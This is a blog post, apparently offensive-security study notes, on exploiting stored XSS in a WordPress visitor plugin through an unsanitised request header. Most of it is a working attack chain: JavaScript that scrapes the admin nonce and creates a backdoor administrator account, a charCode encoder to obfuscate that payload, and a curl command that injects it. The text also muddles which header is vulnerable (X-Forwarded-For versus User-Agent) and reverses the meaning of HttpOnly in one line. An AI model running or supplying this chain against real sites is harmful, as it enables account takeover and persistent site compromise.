---
layout: post
title: XSS
titledate: 08/18/23
tags: ["infosec","offsec","web", "xss", "wordpress"]
---

WordPress has numerous plugins many of which have been found vulnerable to XSS attacks

Examining the visitor plugin's database.php file shows how information is captured from the user and stored in the database

```php
ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
```

Here we can see the HTTP header X-Forwarded-For is captured and stored as the ip variable

When the visitor plugin is loaded there are a couple php pages that can execute one of which is start.php

```html
<td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
```

We can see that the ip is stored in an html table row directly without any sanitization from the captured user's HTTP header.
This can obviously lead to injection and pollution of code

<h4>XSS in Burpsuite</h4>

We can write a script to send http requests with a crafted header, or more easily use curl or Burpsuite to modify the header and inspect the result

With the Browser Network Settings Proxy configuration set to localhost port 8080 -

Leave intercept off and browse to the root site page

In the Target - History - panel you'll see the GET / request for the root of the site

If we right click and send it to repearter we can then modify this request

![_config.yml]({{ site.baseurl }}/images/web/burp_xss_1.png)

Now after sending this request to the target our User-Agent header should have been stored in the database.php waiting to be triggered by the start.php script

We need to login to have access to this plugin and trigger the script

<h4>XSS Priv Escalation</h4>

Now that we can have code executed from the admin user we can try to capture cookies or session information

The Secure flag lets the borwser know it can only send cookies over https and HttpOnly means javascript does get access to the cookie, if HttpOnly is not set an xss payload can send the session cookie back to the attacker

We can inspect session cookies when we are logged in to see which flags are set by clicking on the 'Storage' tab of the browser Developer Tools 

To create an Admin account we need to create a JS function that retrieves tha admin nonce

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=poopy@pooper.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

This function above will be our backdoor admin account

We need to ensure it gets processed correctly during the http request so to do so we minifiy it and encode it 

[minify](https://jscompress.com)

& encode in the browser console

```js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

The encode function above encodes each character with charCodeAt to UTF-16

Finally to inject our backdoor account via the vulnerable HTTP header we send the request 

-- via curl

<h3> $ curl -i http://site.com/ --user-agent "<script>eval(String.fromCharCode(encoded))</script>" --proxy 127.0.0.1:8080</h3>